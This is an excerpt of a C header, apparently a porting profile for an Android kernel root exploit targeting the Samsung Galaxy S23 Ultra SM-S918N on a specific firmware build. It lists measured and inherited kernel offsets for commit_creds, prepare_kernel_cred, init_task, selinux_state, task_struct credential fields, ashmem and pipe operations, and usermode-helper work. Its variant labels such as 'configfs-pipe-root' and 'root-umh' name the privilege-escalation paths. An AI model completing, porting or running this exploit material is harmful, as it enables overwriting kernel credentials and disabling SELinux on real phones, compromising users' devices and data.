...
// dm3q-S918NKSS8FZG1 port — Galaxy S23 Ultra SM-S918N (Korea).
// Kernel: 5.15.189-android13-8-33413713-abS918NKSS8FZG1 (#1 SMP PREEMPT
// Wed Jul 8 02:52:55 UTC 2026). Same 33413713 build family as the
// hardware-verified S918BXXSAFZF5 / S916BXXSAFZG1 profiles.
// Port base: dm3q-S918BXXSAFZF5 profile.
//   MEASURED   = derived from the device kallsyms + raw Image in this port
//                (see docs/SM-S918N-S918NKSS8FZG1.md, OFFSETS.md, PROVENANCE.json).
//   INHERITED  = taken from the same-family S918B FZF5 profile; MUST be
//                re-validated against S918N BTF/disassembly/on-device before release.
//   DERIVED    = computed per docs/PORTING.md.
// NOT hardware-validated yet — use only on a device you own.
...
#define BUILD_VARIANT_LABEL "dm3q-S918NKSS8FZG1-tracefs-shaped-configfs-pipe-root"
...
#else
#define BUILD_VARIANT_LABEL "dm3q-S918NKSS8FZG1-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
// TODO: confirm ro.build.fingerprint product name on the Korean SM-S918N SKU.
#define BUILD_FINGERPRINT \
  "samsung/dm3q/<VERIFY>/dm3q:16/BP4A.251205.006/S918NKSS8FZG1:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL   // MEASURED (_text)
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET 0x80000000ULL
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0xa7e58000ULL       // INHERITED (S918B FZF5) — derive from S918N sboot.bin
#endif

#define SKB_DATA_DELTA (-0xe80LL)               // INHERITED (S918B FZF5)
...
#define SLIDE_TRACEFS_EVENT_ID 108              // DERIVED: 20 + ((__event_sched_blocked_reason - __start_ftrace_events)/8) = 20+88
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010db44ULL  // INHERITED (S918B FZF5)
#define SLIDE_TRACEFS_VFORK_CALLER_OFF 0x000c8fe4ULL  // INHERITED (S918B FZF5)
...
#error S918N stack writer must be set by the build
#endif
...
#define P0_FINGERPRINT_HEADER \
  "targets/dm3q-S918NKSS8FZG1/p0_fingerprint.h"
#endif
...
#define TASK_STRUCT_CRED_OFF      0x798ULL      // INHERITED (S918B FZF5); verify via S918N BTF
#define TASK_STRUCT_REAL_CRED_OFF 0x790ULL      // INHERITED (S918B FZF5)
#define FAKE_TASK_TASK_GROUP_OFF  0x400ULL      // INHERITED (S918B FZF5)

#define INIT_TASK_OFF             0x02c05080ULL // MEASURED (init_task)
#define PREPARE_KERNEL_CRED_OFF   0x0011e3c8ULL // MEASURED (prepare_kernel_cred)
#define COMMIT_CREDS_OFF          0x00120104ULL // MEASURED (commit_creds)
#define OVERRIDE_CREDS_OFF        0x0011f1dcULL // MEASURED (override_creds)
#define ROOT_TASK_GROUP_OFF       0x02cb9ac0ULL // MEASURED (root_task_group)
#define SELINUX_ENFORCING_OFF     0x02d8e5c0ULL // MEASURED (selinux_state)
#define KMALLOC_CACHES_OFF        0x020642f8ULL // MEASURED (kmalloc_caches)
#define ANON_PIPE_BUF_OPS_OFF     0x01e7f2e0ULL // MEASURED (anon_pipe_buf_ops)
#define SYSTEM_UNBOUND_WQ_OFF     0x02a90800ULL // MEASURED (system_unbound_wq)
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001045d0ULL // MEASURED (call_usermodehelper_exec_work)

#define ASHMEM_FOPS_OFF           0x0200d338ULL // MEASURED (ashmem_fops)
#define ASHMEM_MISC_FOPS_OFF      0x02bfcf18ULL // MEASURED (ashmem_misc)
#define ASHMEM_IOCTL_OFF          0x0114c6dcULL // MEASURED (ashmem_ioctl)
#define ASHMEM_COMPAT_IOCTL_OFF   0x0114cd38ULL // INHERITED (not listed in device kallsyms)
#define ASHMEM_MMAP_OFF           0x0114cd90ULL // MEASURED (ashmem_mmap)
#define ASHMEM_OPEN_OFF           0x0114d070ULL // MEASURED (ashmem_open)
#define ASHMEM_RELEASE_OFF        0x0114d108ULL // MEASURED (ashmem_release)
#define ASHMEM_SHOW_FDINFO_OFF    0x0114d224ULL // MEASURED (ashmem_show_fdinfo)
#define CONFIGFS_READ_ITER_OFF    0x005d7420ULL // MEASURED (configfs_read_iter)
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005d7e48ULL // MEASURED (configfs_bin_write_iter)
#define COPY_SPLICE_READ_OFF      0x00528198ULL // MEASURED (generic_file_splice_read)
#define NOOP_LLSEEK_OFF           0x004bbd34ULL // MEASURED (noop_llseek)
...
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01d5db2eULL   // MEASURED ("nfnetlink_log" string scan)
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02a91e48ULL // MEASURED (nfulnl_logger object)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02bba9c8ULL // MEASURED (qword pointing at sysctl_bootid)
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02e6c0b1ULL        // MEASURED (sysctl_bootid)
